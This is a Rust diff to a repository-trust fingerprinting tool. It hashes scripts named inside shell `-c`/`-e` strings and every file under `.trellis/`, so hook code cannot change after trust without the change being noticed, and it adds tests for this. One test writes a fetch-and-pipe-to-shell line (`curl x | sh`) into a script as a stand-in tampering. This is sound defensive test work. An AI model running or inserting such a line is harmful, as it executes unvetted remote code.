@@ -39,30 +39,33 @@ impl TrustItem {
     /// path with no `..`, or an absolute path under `root`, and a regular
     /// file is there. A program found on `PATH` is not repository code and is
     /// not hashed; a script the repository ships is.
+    ///
+    /// The string after `-c` or `-e` (`sh -c`, `python -c`, `node -e`) or
+    /// `/C` (`cmd /C`) is code, not a path, so it is also split into
+    /// shell-ish tokens and every token that is a file in the repository is
+    /// hashed: `["sh", "-c", "./scripts/check.sh"]` covers the script.
+    /// Code reached any other way — an import, `python -m pkg.mod`, a file
+    /// a script reads — is covered only if it lives under `.trellis/`,
+    /// which [`Fingerprint`] hashes whole (ADR 0023 §4).
     pub fn command(root: &Path, label: String, argv: &[String], detail: String) -> Self {
-        let mut files = Vec::new();
-        for arg in argv {
-            let p = Path::new(arg);
-            let full = if p.is_absolute() {
-                if !p.starts_with(root) {
-                    continue;
-                }
-                p.to_path_buf()
-            } else {
-                if arg.is_empty() || p.components().any(|c| c.as_os_str() == "..") {
-                    continue;
-                }
-                root.join(p)
-            };
-            if let Ok(bytes) = std::fs::read(&full)
-                && full.is_file()
+        let mut files: Vec<(String, String)> = Vec::new();
+        let mut add = |candidate: &str| {
+            if let Some(f) = repo_file(root, candidate)
+                && !files.iter().any(|(p, _)| *p == f.0)
             {
-                let rel = full
-                    .strip_prefix(root)
-                    .unwrap_or(&full)
-                    .to_string_lossy()
-                    .replace('\\', "/");
-                files.push((rel, hex(&Sha256::digest(&bytes))));
+                files.push(f);
+            }
+        };
+        for (i, arg) in argv.iter().enumerate() {
+            add(arg);
+            let is_code = i > 0 && matches!(argv[i - 1].as_str(), "-c" | "-e" | "/C" | "/c");
+            if is_code {
+                for tok in arg.split(|c: char| {
+                    c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '<' | '>')
+                }) {
+                    let tok = tok.trim_matches(|c| matches!(c, '"' | '\'' | '`'));
+                    add(tok);
+                }
             }
         }
         Self {
@@ -72,6 +75,71 @@ impl TrustItem {
             files,
         }
     }
+}
+
+/// `(repository-relative path, sha256)` when `arg` names a regular file
+/// inside `root`: a relative path with no `..`, or an absolute one under
+/// `root`. A program found on `PATH` is not repository code and is not
+/// hashed; a script the repository ships is.
+fn repo_file(root: &Path, arg: &str) -> Option<(String, String)> {
+    let p = Path::new(arg);
+    let full = if p.is_absolute() {
+        if !p.starts_with(root) {
+            return None;
+        }
+        p.to_path_buf()
+    } else {
+        if arg.is_empty() || p.components().any(|c| c.as_os_str() == "..") {
+            return None;
+        }
+        root.join(p)
+    };
+    if !full.is_file() {
+        return None;
+    }
+    let bytes = std::fs::read(&full).ok()?;
+    Some((rel(root, &full), hex(&Sha256::digest(&bytes))))
+}
+
+fn rel(root: &Path, full: &Path) -> String {
+    full.strip_prefix(root)
+        .unwrap_or(full)
+        .to_string_lossy()
+        .replace('\\', "/")
+        .trim_start_matches("./")
+        .to_string()
+}
+
+/// Every file under `.trellis/`, sorted, with its sha256 — except what
+/// trellis itself writes there on every run (`runs/`, the trails, and
+/// `index.bin`, the index cache), which would otherwise make a repository
+/// untrusted after each run. Hook and tool code kept under
+/// `.trellis/hooks/` or `.trellis/tools/` is covered by this whatever
+/// reaches it: an import, `-m`, a file a script reads.
+fn dot_trellis_files(root: &Path) -> Vec<(String, String)> {
+    fn walk(root: &Path, dir: &Path, top: bool, out: &mut Vec<(String, String)>) {
+        let Ok(rd) = std::fs::read_dir(dir) else {
+            return;
+        };
+        for e in rd.filter_map(Result::ok) {
+            let path = e.path();
+            let name = e.file_name();
+            let name = name.to_string_lossy();
+            if top && (name == "runs" || name.starts_with("index.bin")) {
+                continue;
+            }
+            let Ok(ft) = e.file_type() else { continue };
+            if ft.is_dir() {
+                walk(root, &path, false, out);
+            } else if let Ok(bytes) = std::fs::read(&path) {
+                out.push((rel(root, &path), hex(&Sha256::digest(&bytes))));
+            }
+        }
+    }
+    let mut out = Vec::new();
+    walk(root, &root.join(".trellis"), true, &mut out);
+    out.sort();
+    out
 }
 
 /// Everything a repository would execute, and one digest over all of it.
@@ -130,6 +198,18 @@ impl Fingerprint {
             ));
         }
         items.extend(extra);
+        // Only when something would execute: a repository that declares
+        // nothing still has nothing to trust, whatever `.trellis/` holds.
+        if !items.is_empty() {
+            items.push(TrustItem {
+                label: ".trellis/ (every file)".to_string(),
+                argv: Vec::new(),
+                detail: "all files under .trellis/ except runs/ and index.bin, which \
+                         trellis writes itself"
+                    .to_string(),
+                files: dot_trellis_files(root),
+            });
+        }
         let canonical = serde_json::to_vec(&items).expect("a list of strings always serializes");
         Self {
             sha256: hex(&Sha256::digest(&canonical)),
@@ -378,6 +458,60 @@ mod tests {
         assert!(!store.revoke(a.path()).unwrap());
         assert_eq!(store.state(a.path(), &fa).unwrap(), TrustState::Unknown);
         assert_eq!(store.state(b.path(), &fb).unwrap(), TrustState::Trusted);
+    }
+
+    #[test]
+    fn a_script_named_inside_a_shell_string_is_hashed() {
+        // The risk: `["sh", "-c", "./scripts/check.sh"]` names no file as an
+        // argv element, so the script it runs was hashed by nothing and
+        // could change after trust without anyone being asked again.
+        let repo = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(repo.path().join("scripts")).unwrap();
+        std::fs::write(repo.path().join("scripts/check.sh"), "exit 0\n").unwrap();
+        let h = hooks(&["sh", "-c", "./scripts/check.sh --fast && echo ok"]);
+        let fp = Fingerprint::of(repo.path(), &h, &[], None);
+        assert_eq!(
+            fp.items[0]
+                .files
+                .iter()
+                .map(|f| f.0.as_str())
+                .collect::<Vec<_>>(),
+            ["scripts/check.sh"]
+        );
+        std::fs::write(repo.path().join("scripts/check.sh"), "curl x | sh\n").unwrap();
+        assert_ne!(
+            fp.sha256,
+            Fingerprint::of(repo.path(), &h, &[], None).sha256
+        );
+    }
+
+    #[test]
+    fn a_change_anywhere_under_dot_trellis_changes_the_digest_except_run_output() {
+        // The risk: `python -m tools.hook` reaches code through an import,
+        // which no argv names. Code under `.trellis/` is covered whole;
+        // what trellis itself writes there (trails, the index cache) is not,
+        // or every run would untrust the repository.
+        let repo = tempfile::tempdir().unwrap();
+        let hooks_dir = repo.path().join(".trellis/hooks");
+        std::fs::create_dir_all(&hooks_dir).unwrap();
+        std::fs::write(hooks_dir.join("gate.py"), "print('ok')\n").unwrap();
+        let h = hooks(&["python", "-m", "gate"]);
+        let base = Fingerprint::of(repo.path(), &h, &[], None).sha256;
+
+        std::fs::create_dir_all(repo.path().join(".trellis/runs")).unwrap();
+        std::fs::write(repo.path().join(".trellis/runs/r.json"), "{}").unwrap();
+        std::fs::write(repo.path().join(".trellis/index.bin"), [0u8, 1, 2]).unwrap();
+        assert_eq!(
+            base,
+            Fingerprint::of(repo.path(), &h, &[], None).sha256,
+            "trails and the index cache are trellis's output, not repository code"
+        );
+
+        std::fs::write(hooks_dir.join("gate.py"), "import os\n").unwrap();
+        assert_ne!(base, Fingerprint::of(repo.path(), &h, &[], None).sha256);
+
+        // With nothing declared there is still nothing to trust.
+        assert!(Fingerprint::of(repo.path(), &HookConfig::default(), &[], None).is_empty());
     }
 
     #[test]
